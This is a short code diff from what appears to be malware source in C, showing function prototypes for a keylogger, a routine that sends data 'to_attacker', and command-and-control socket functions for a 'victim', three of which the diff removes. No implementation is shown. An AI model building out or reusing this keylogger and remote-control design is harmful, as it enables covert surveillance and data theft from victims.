@@ -33,9 +33,6 @@ int builtin_exit(char **args);
 int launch(char **command_arr, u_char *args);
 void send_to_attacker(u_char *args);
 void* activate_keylogger(void* arg);
-void* activate_cnc(void* arg);
-void cnc_select_call(struct options_victim *opts, struct sockaddr_in cnc_address);
-void create_victim_cnc_socket(struct options_victim *opts, struct sockaddr_in *cnc_address);
 void* check_directory(void* arg);
 
 int (*builtin_func[]) (char **) = {
